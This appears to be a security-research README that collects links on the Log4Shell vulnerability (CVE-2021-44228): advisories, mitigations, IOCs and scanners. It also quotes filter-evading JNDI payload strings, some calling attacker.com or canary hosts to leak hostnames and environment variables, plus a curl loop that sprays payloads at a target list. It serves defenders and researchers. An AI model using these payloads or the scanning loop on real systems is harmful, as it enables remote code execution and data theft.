## CVE-2021-44228, log4j / log4shell Security Research Summary

### Threat Intel
| URL | Info |
| --- | --- |
| https://musana.net/2021/12/13/log4shell-Quick-Guide/ | log4shell-Quick-Guide |
| https://www.bsi.bund.de/SharedDocs/Cybersicherheitswarnungen/DE/2021/2021-549032-10F2.pdf?__blob=publicationFile&v=6 | BSI Warning |
| https://www.lunasec.io/docs/blog/log4j-zero-day/ | Log4Shell: RCE 0-day exploit found in log4j 2, a popular Java logging package |
| https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java | Critical RCE Vulnerability: log4j - CVE-2021-44228 |
| https://zero.bs/sb-2121-log4j-rce-cve-2021-44228.html | SB 21.21 ] Log4J - RCE (CVE-2021-44228) |
| https://www.bleepingcomputer.com/news/security/new-zero-day-exploit-for-log4j-java-library-is-an-enterprise-nightmare/ | New zero-day exploit for Log4j Java library is an enterprise nightmare |
| https://www.bleepingcomputer.com/news/security/researchers-release-vaccine-for-critical-log4shell-vulnerability/ | Researchers release 'vaccine' for critical Log4Shell vulnerability |
| https://github.com/apache/logging-log4j2/pull/607 | LOG4J2-3198: Log4j2 no longer formats lookups in messages by default #607 |
| https://issues.apache.org/jira/browse/LOG4J2-3198 | LOG4J2-3198 |
| https://github.com/YfryTchsGD/Log4jAttackSurface | Log4jAttackSurface |
| https://github.com/NCSC-NL/log4shell/tree/main/software | Log4j overview related software |
| https://github.com/apache/logging-log4j2/pull/608#issuecomment-991723301 | Affected log4j Version |
| https://logging.apache.org/log4j/2.x/security.html | Apache Log4j Security Vulnerabilities |
| https://twitter.com/marcioalm/status/1470361495405875200?s=09 | JNDI-Exploit-Kit targets ANY version of Java |

### Mitigations / Fixes
| URL | Info |
| --- | --- |
| https://logging.apache.org/log4j/2.x/changes-report.html#a2.16.0 | Disable JNDI by default. Require log4j2.enableJndi to be set to true to allow JNDI. Fixes LOG4J2-3208 / Completely remove support for Message Lookups. Fixes LOG4J2-3211 |

<p align="center">
  <img width="600" height="450" src="https://github.com/0xsyr0/CVE-2021-44228-log4j-log4shell-Security-Research-Summary/blob/main/files/log4j_attack.png">
</p>

Source: https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/

### Malware Incidents
| URL | Info |
| --- | --- |
| https://twitter.com/80vul/status/1470272820571963392?s=20 | Bad news Ransomware has landed on #log4j2 RCE |

### Advisory
| URL | Info |
| --- | --- |
| https://confluence.atlassian.com/kb/faq-for-cve-2021-44228-1103069406.html | Atlassian |
| https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592 | BlueTeam CheatSheet *Log4Shell* |
| https://kb.vmware.com/s/article/87081 | 87081 |
| https://kb.vmware.com/s/article/87092 | 87092 |
| https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/ | Guidance for preventing, detecting, and hunting for CVE-2021-44228 Log4j 2 exploitation |

### IOCs / Callback URLs and IP addresses
| URL | Info |
| --- | --- |
| https://gist.github.com/superducktoes/9b742f7b44c71b4a0d19790228ce85d8 | Callback Domains for log4j |
| https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/Log4j_IOC_List.csv | Azure-Sentinel |
| https://github.com/curated-intel/Log4Shell-IOCs | Log4Shell-IOCs |
| https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes | Log4Shell-Hashses |
| https://www.virustotal.com/gui/collection/04c6ab336e767ae9caee992902c4f3039ccee24df7458cd7cbaf3182644b3044/iocs | VirusTotal IOCs |
| https://samples.vx-underground.org/samples/Families/Log4J%20Malware/ | Driveby Malware Samples (Password: infected) |

### Public Honeypots
| URL | Info |
| --- | --- |
| https://isc.sans.edu/api/webhoneypotreportsbyua/jndi | SANS jndi |

### Payloads / Obfuscation / WAF Bypass
| URL | Info |
| --- | --- |
| https://gist.github.com/ZephrFish/32249cae56693c1e5484888267d07d39 | log4j payloads |
| https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a | log4j-keywords |

https://twitter.com/Rezn0k/status/1469523006015750146?s=09

If you're filtering on "ldap", "jndi", or the ${lower:x} method, I have bad news for you: 
```c
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}
```
// attacker.com/a} This gets past every filter I've found so far. There's no shortage of these bypasses.

https://twitter.com/ymzkei5/status/1469765165348704256?s=09

There may be many ways to avoid detection :(
```c
jn${env::-}di: jn${date:}di${date:':'} j${k8s:k5:-ND}i${sd:k5:-:} j${main:\k5:-Nd}i${spring:k5:-:} j${sys:k5:-nD}${lower:i${web:k5:-:}} j${::-nD}i${::-:} j${EnV:K5:-nD}i: j${loWer:Nd}i${uPper::}
```

https://twitter.com/ymzkei5/status/1469765165348704256?s=09
1. `${jndi:ldap://127.0.0.1:1389/ badClassName}`
2. `${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}`
3. `${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}`
4. `${jndi:rmi://adsasd.asdasd.asdasd}`

#### Canary Token Testing
```c
cat targets.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "X-Api-Version: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "User-Agent: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}";done
```
```c
${jndi:ldap://${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}..[L4J.TOKEN.canarytokens.com/a](http://l4j.TOKEN.canarytokens.com/a)}  
test+(${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}.[L4J.TOKEN.canarytokens.com/a})@foobar.com](http://l4j.TOKEN.canarytokens.com/a%7D)@foobar.com)
```
RFC conform Email Payload
```c
test+(${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}.L4J.TOKEN.canarytokens.com/a})@foobar.com
```

### Toolkit / Vulnerability Scanning
| URL | Info |
| --- | --- |
| https://canarytokens.org/generate# | Canary Tokens |
| https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b | # log4j RCE Exploitation Detection |
| https://github.com/Neo23x0/log4shell-detector | log4shell-detector |
| https://github.com/fullhunt/log4j-scan | log4j-scan |
| https://github.com/r0mdau/ansible-role-log4shell-detector | ansible-role-log4shell-detector |
| https://github.com/Cybereason/Logout4Shell | Logout4Shell |
| https://github.com/dtact/divd-2021-00038--log4j-scanner | divd-2021-00038--log4j-scanner |
| https://github.com/pimps/JNDI-Exploit-Kit | JNDI-Exploit-Kit 
